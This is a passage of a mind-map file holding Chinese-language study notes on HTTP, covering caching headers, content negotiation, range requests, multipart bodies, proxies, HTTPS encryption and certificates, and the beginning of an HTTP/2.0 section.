<node ID="ID_356983508" CREATED="1754750475241" MODIFIED="1754750475244"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 优点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 优点" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-优点">
</a>
    <ul dir="auto">
      <li>
        缓解服务器压力；
      </li>
      <li>
        降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1680383201" CREATED="1754750475244" MODIFIED="1754750475246"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 实现方法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 实现方法" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-实现方法">
</a>
    <ul dir="auto">
      <li>
        让代理服务器进行缓存；
      </li>
      <li>
        让客户端浏览器进行缓存。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1917708324" CREATED="1754750475246" MODIFIED="1754750475248"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. Cache-Control
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. Cache-Control" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3-cache-control">
</a>
    <p dir="auto">
      HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。
    </p>
    <p dir="auto">
      <strong>3.1 禁止进行缓存</strong>
    </p>
    <p dir="auto">
      no-store 指令规定不能对请求或响应的任何一部分进行缓存。
    </p>
    <pre>Cache-Control: no-store</pre>
    <p dir="auto">
      <strong>3.2 强制确认缓存</strong>
    </p>
    <p dir="auto">
      no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。
    </p>
    <pre>Cache-Control: no-cache</pre>
    <p dir="auto">
      <strong>3.3 私有缓存和公共缓存</strong>
    </p>
    <p dir="auto">
      private 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。
    </p>
    <pre>Cache-Control: private</pre>
    <p dir="auto">
      public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。
    </p>
    <pre>Cache-Control: public</pre>
    <p dir="auto">
      <strong>3.4 缓存过期机制</strong>
    </p>
    <p dir="auto">
      max-age 指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。
    </p>
    <p dir="auto">
      max-age 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。
    </p>
    <pre>Cache-Control: max-age=31536000</pre>
    <p dir="auto">
      Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。
    </p>
    <pre>Expires: Wed, 04 Jul 2012 08:26:05 GMT</pre>
    <ul dir="auto">
      <li>
        在 HTTP/1.1 中，会优先处理 max-age 指令；
      </li>
      <li>
        在 HTTP/1.0 中，max-age 指令会被忽略掉。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1426175086" CREATED="1754750475249" MODIFIED="1754750475250"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 缓存验证
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 缓存验证" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#4-缓存验证">
</a>
    <p dir="auto">
      需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 <code>http://www.google.com/</code>&#xa0;有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。
    </p>
    <pre>ETag: &quot;82e22293907ce725faf67773957acd12&quot;</pre>
    <p dir="auto">
      可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。
    </p>
    <pre>If-None-Match: &quot;82e22293907ce725faf67773957acd12&quot;</pre>
    <p dir="auto">
      Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 304 Not Modified 响应报文。
    </p>
    <pre>Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT</pre>
    <pre>If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_318479293" CREATED="1754750475251" MODIFIED="1754750475254"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内容协商
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内容协商" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#内容协商">
</a>
    <p dir="auto">
      通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1845350426" CREATED="1754750475254" MODIFIED="1754750475257"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-类型">
</a>
    <p dir="auto">
      <strong>1.1 服务端驱动型</strong>
    </p>
    <p dir="auto">
      客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。
    </p>
    <p dir="auto">
      它存在以下问题：
    </p>
    <ul dir="auto">
      <li>
        服务器很难知道客户端浏览器的全部信息；
      </li>
      <li>
        客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；
      </li>
      <li>
        给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。
      </li>
    </ul>
    <p dir="auto">
      <strong>1.2 代理驱动型</strong>
    </p>
    <p dir="auto">
      服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1428925303" CREATED="1754750475257" MODIFIED="1754750475259"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. Vary
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. Vary" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-vary">
</a>
    <pre>Vary: Accept-Language</pre>
    <p dir="auto">
      在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。
    </p>
    <p dir="auto">
      例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 <code>Vary: Accept-Language</code>&#xa0;内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1291064787" CREATED="1754750475260" MODIFIED="1754750475262"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内容编码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内容编码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#内容编码">
</a>
    <p dir="auto">
      内容编码将实体主体进行压缩，从而减少传输的数据量。
    </p>
    <p dir="auto">
      常用的内容编码有：gzip、compress、deflate、identity。
    </p>
    <p dir="auto">
      浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 Content-Encoding。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1143964872" CREATED="1754750475262" MODIFIED="1754750475264"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      范围请求
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 范围请求" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#范围请求">
</a>
    <p dir="auto">
      如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1355855768" CREATED="1754750475264" MODIFIED="1754750475266"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Range
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. Range" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-range">
</a>
    <p dir="auto">
      在请求报文中添加 Range 首部字段指定请求的范围。
    </p>
    <pre>GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023</pre>
    <p dir="auto">
      请求成功的话服务器返回的响应包含 206 Partial Content 状态码。
    </p>
    <pre>HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_951887593" CREATED="1754750475266" MODIFIED="1754750475268"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. Accept-Ranges
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. Accept-Ranges" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-accept-ranges">
</a>
    <p dir="auto">
      响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。
    </p>
    <pre>Accept-Ranges: bytes</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_5164284" CREATED="1754750475268" MODIFIED="1754750475270"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 响应状态码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 响应状态码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3-响应状态码">
</a>
    <ul dir="auto">
      <li>
        在请求成功的情况下，服务器会返回 206 Partial Content 状态码。
      </li>
      <li>
        在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。
      </li>
      <li>
        在不支持范围请求的情况下，服务器会返回 200 OK 状态码。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1945839727" CREATED="1754750475270" MODIFIED="1754750475273"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分块传输编码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分块传输编码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#分块传输编码">
</a>
    <p dir="auto">
      Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1922763981" CREATED="1754750475274" MODIFIED="1754750475275"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      多部分对象集合
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 多部分对象集合" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#多部分对象集合">
</a>
    <p dir="auto">
      一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。
    </p>
    <p dir="auto">
      例如，上传多个表单时可以使用如下方式：
    </p>
    <pre>Content-Type: multipart/form-data; boundary=AaB03x
--AaB03x
Content-Disposition: form-data; name=&quot;submit-name&quot;
Larry
--AaB03x
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;
Content-Type: text/plain
... contents of file1.txt ...
--AaB03x--</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_547858621" CREATED="1754750475276" MODIFIED="1754750475277"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      虚拟主机
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 虚拟主机" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#虚拟主机">
</a>
    <p dir="auto">
      HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1458087960" CREATED="1754750475278" MODIFIED="1754750475278"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      通信数据转发
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1313575052" CREATED="1754750475279" MODIFIED="1754750475281"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 代理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 代理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-代理">
</a>
    <p dir="auto">
      代理服务器接受客户端的请求，并且转发给其它服务器。
    </p>
    <p dir="auto">
      使用代理的主要目的是：
    </p>
    <ul dir="auto">
      <li>
        缓存
      </li>
      <li>
        负载均衡
      </li>
      <li>
        网络访问控制
      </li>
      <li>
        访问日志记录
      </li>
    </ul>
    <p dir="auto">
      代理服务器分为正向代理和反向代理两种：
    </p>
    <ul dir="auto">
      <li>
        用户察觉得到正向代理的存在。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6436814e2d1780ad804b2f3f4d106a25eb9f83df000acd20b7f6ea2d95462e8d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61333134626237392d356231382d346536332d613937362d3334343862666661366631622e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/6436814e2d1780ad804b2f3f4d106a25eb9f83df000acd20b7f6ea2d95462e8d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61333134626237392d356231382d346536332d613937362d3334343862666661366631622e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a314bb79-5b18-4e63-a976-3448bffa6f1b.png"/>
    </a><br/>
    

    <ul dir="auto">
      <li>
        而反向代理一般位于内部网络中，用户察觉不到。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/982344870e0591eb32b61696a9a455f6d0366949c25a42af7b35476144166b12/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32643039613834372d623835342d343339632d393139382d6232396336353831303934342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/982344870e0591eb32b61696a9a455f6d0366949c25a42af7b35476144166b12/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32643039613834372d623835342d343339632d393139382d6232396336353831303934342e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2d09a847-b854-439c-9198-b29c65810944.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_596838649" CREATED="1754750475282" MODIFIED="1754750475283"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 网关
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 网关" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-网关">
</a>
    <p dir="auto">
      与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1692601296" CREATED="1754750475284" MODIFIED="1754750475285"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 隧道
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 隧道" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3-隧道">
</a>
    <p dir="auto">
      使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1096770924" CREATED="1754750475286" MODIFIED="1754750475288"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、HTTPS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、HTTPS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#六https">
</a>
    <p dir="auto">
      HTTP 有以下安全性问题：
    </p>
    <ul dir="auto">
      <li>
        使用明文进行通信，内容可能会被窃听；
      </li>
      <li>
        不验证通信方的身份，通信方的身份有可能遭遇伪装；
      </li>
      <li>
        无法证明报文的完整性，报文有可能遭篡改。
      </li>
    </ul>
    <p dir="auto">
      HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。
    </p>
    <p dir="auto">
      通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a517f7a575f963bb6e3fd356b1f8e41702840fa708ebf365c84198f3bbfeba7d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f73736c2d6f66666c6f6164696e672e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/a517f7a575f963bb6e3fd356b1f8e41702840fa708ebf365c84198f3bbfeba7d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f73736c2d6f66666c6f6164696e672e6a7067" width="700" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ssl-offloading.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_812733500" CREATED="1754750475288" MODIFIED="1754750475288"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      加密
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1168811506" CREATED="1754750475291" MODIFIED="1754750475294"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 对称密钥加密
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 对称密钥加密" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-对称密钥加密">
</a>
    <p dir="auto">
      对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。
    </p>
    <ul dir="auto">
      <li>
        优点：运算速度快；
      </li>
      <li>
        缺点：无法安全地将密钥传输给通信方。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8f286b3df1b4381591f7f8d1fe22282100fa5760d6918f72bb9213191478a032/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37666666613462382d623336642d343731662d616430632d6138386565373633626237362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/8f286b3df1b4381591f7f8d1fe22282100fa5760d6918f72bb9213191478a032/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37666666613462382d623336642d343731662d616430632d6138386565373633626237362e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7fffa4b8-b36d-471f-ad0c-a88ee763bb76.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1829027524" CREATED="1754750475294" MODIFIED="1754750475296"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2.非对称密钥加密
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2.非对称密钥加密" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2非对称密钥加密">
</a>
    <p dir="auto">
      非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。
    </p>
    <p dir="auto">
      公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。
    </p>
    <p dir="auto">
      非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。
    </p>
    <ul dir="auto">
      <li>
        优点：可以更安全地将公开密钥传输给通信发送方；
      </li>
      <li>
        缺点：运算速度慢。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/866faa9ef0f2ad56be3c937d7f49ec561f46fbf93d6f90f17d16508e475129a3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33396363623239392d656539392d346464312d623862342d3266396563393439356362342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/866faa9ef0f2ad56be3c937d7f49ec561f46fbf93d6f90f17d16508e475129a3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33396363623239392d656539392d346464312d623862342d3266396563393439356362342e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/39ccb299-ee99-4dd1-b8b4-2f9ec9495cb4.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_500569807" CREATED="1754750475296" MODIFIED="1754750475298"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. HTTPS 采用的加密方式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. HTTPS 采用的加密方式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3-https-采用的加密方式">
</a>
    <p dir="auto">
      上面提到对称密钥加密方式的传输效率更高，但是无法安全地将密钥 Secret Key 传输给通信方。而非对称密钥加密方式可以保证传输的安全性，因此我们可以利用非对称密钥加密方式将 Secret Key 传输给通信方。HTTPS 采用混合的加密机制，正是利用了上面提到的方案：
    </p>
    <ul dir="auto">
      <li>
        使用非对称密钥加密方式，传输对称密钥加密方式所需要的 Secret Key，从而保证安全性;
      </li>
      <li>
        获取到 Secret Key 后，再使用对称密钥加密方式进行通信，从而保证效率。（下图中的 Session Key 就是 Secret Key）
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d64582e2f2ef200aacd0be04e1d2ac820bbc62e828afacc4c95265acaff98f64/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f486f772d48545450532d576f726b732e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/d64582e2f2ef200aacd0be04e1d2ac820bbc62e828afacc4c95265acaff98f64/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f486f772d48545450532d576f726b732e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/How-HTTPS-Works.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_180033961" CREATED="1754750475298" MODIFIED="1754750475300"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      认证
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 认证" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#认证">
</a>
    <p dir="auto">
      通过使用 <strong>证书</strong>&#xa0;来对通信方进行认证。
    </p>
    <p dir="auto">
      数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。
    </p>
    <p dir="auto">
      服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。
    </p>
    <p dir="auto">
      进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/78cfa7b8aa69f8909b9b329c6371b3683495a20963a07f4f9d69e18f51e0e4ec/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f323031372d30362d31312d63612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/78cfa7b8aa69f8909b9b329c6371b3683495a20963a07f4f9d69e18f51e0e4ec/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f323031372d30362d31312d63612e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2017-06-11-ca.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_598101293" CREATED="1754750475301" MODIFIED="1754750475302"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      完整性保护
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 完整性保护" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#完整性保护">
</a>
    <p dir="auto">
      SSL 提供报文摘要功能来进行完整性保护。
    </p>
    <p dir="auto">
      HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。
    </p>
    <p dir="auto">
      HTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1557557908" CREATED="1754750475303" MODIFIED="1754750475305"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HTTPS 的缺点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: HTTPS 的缺点" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#https-的缺点">
</a>
    <ul dir="auto">
      <li>
        因为需要进行加密解密等过程，因此速度会更慢；
      </li>
      <li>
        需要支付证书授权的高额费用。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_700302296" CREATED="1754750475305" MODIFIED="1754750475305"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、HTTP/2.0
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1625133273" CREATED="1754750475307" MODIFIED="1754750475308"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HTTP/1.x 缺陷
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: HTTP/1.x 缺陷" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#http1x-缺陷">
</a>
    <p dir="auto">
      HTTP/1.x 实现简单是以牺牲性能为代价的：
    </p>
    <ul dir="auto">
      <li>
